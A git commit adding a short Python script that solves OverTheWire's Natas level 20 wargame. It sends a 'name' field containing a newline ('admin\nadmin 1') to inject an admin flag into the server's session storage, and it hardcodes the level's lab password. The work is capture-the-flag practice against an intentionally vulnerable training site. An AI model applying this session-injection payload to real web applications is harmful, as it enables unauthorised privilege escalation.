ba79f8a74604465b457d8a5a92975666a48c191e
unknown <otmani.fad@gmail.com>
2026-02-21 03:46:49 +0100

    init commit

---
+++ natas20.py
@@ -0,0 +1,16 @@
+import requests
+from string import *
+
+
+c = 641
+username = "natas20"
+password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"
+url = f"http://{username}.natas.labs.overthewire.org/?debug=true"
+id = ""
+
+session = requests.Session()
+response = session.post(url, auth=(username, password), data={"name": "admin\nadmin 1"})
+print(response.text)
+print("Status code:", response.status_code)
+response = session.get(url, auth=(username, password))
+print(response.text)
